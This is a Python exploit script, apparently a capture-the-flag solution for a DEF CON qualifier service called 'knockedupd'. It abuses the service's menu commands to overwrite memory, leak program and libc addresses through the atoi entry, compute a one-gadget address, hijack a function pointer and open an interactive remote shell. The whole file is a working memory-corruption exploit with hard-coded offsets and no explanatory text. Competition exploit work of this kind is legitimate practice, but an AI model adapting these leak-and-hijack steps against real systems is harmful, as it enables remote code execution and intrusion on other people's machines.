from pwnpwnpwn import *
import re

host = "10.211.55.16"
port = 8888
#host = "knockedupd_71a592a753bf9dcd7d7ad5fa69b2bab3.quals.shallweplayaga.me"
#port = 9889
sock = make_conn(host,port)
pat = "Data:.*"
atoi_offset = 0x39f50

def accumuler(sock,data):
    recvuntil(sock,">")
    sendline(sock,"accumuler")
    recvuntil(sock,":")
    sendline(sock,str(len(data)))
    recvuntil(sock,":")
    sendline(sock,data)

def update(sock,index,byte,value):
    recvuntil(sock,">")
    sendline(sock,"update")
    recvuntil(sock,":")
    sendline(sock,str(index))
    recvuntil(sock,":")
    sendline(sock,str(byte))
    recvuntil(sock,":")
    sendline(sock,str(value))

def toggle(sock):
    recvuntil(sock,">")
    sendline(sock,"toggle")

def bilan(sock):
    recvuntil(sock,">")
    sendline(sock,"bilan")
    result = recvuntil(sock,"c")
    return result

accumuler(sock,"a"*24)
accumuler(sock,"b"*24)
accumuler(sock,"c"*24)
toggle(sock)
update(sock,0,-20,204)
update(sock,1,-20,12)
data = bilan(sock)
match = re.search(pat,data)
code = match.group()
code = code[6:14]
code = code.ljust(8,'\x00')
codebase = unpack(code) - 0X21c0
atoi = codebase + 0x2070f8
print "codebase: %016x" % codebase
print "atoi: %016x" % atoi

for i in range(8):
    update(sock,1,i+8,(atoi >> i*8) & 0xff)

data = bilan(sock)
match = re.search(pat,data)
lib = match.group()
lib = lib[6:14]
lib = lib.ljust(8,'\x00')
libbase = unpack(lib) - atoi_offset
print "libbase: %016x" % libbase
gadget = libbase + 0xe58c5
print "one-gadget: %016x" % gadget
update(sock,2,-0x54,0xcc)

for i in range(8):
    update(sock,1,i,(gadget >> i*8) & 0xff)

recvuntil(sock,">")
sendline(sock,"accumuler")
inter(sock)

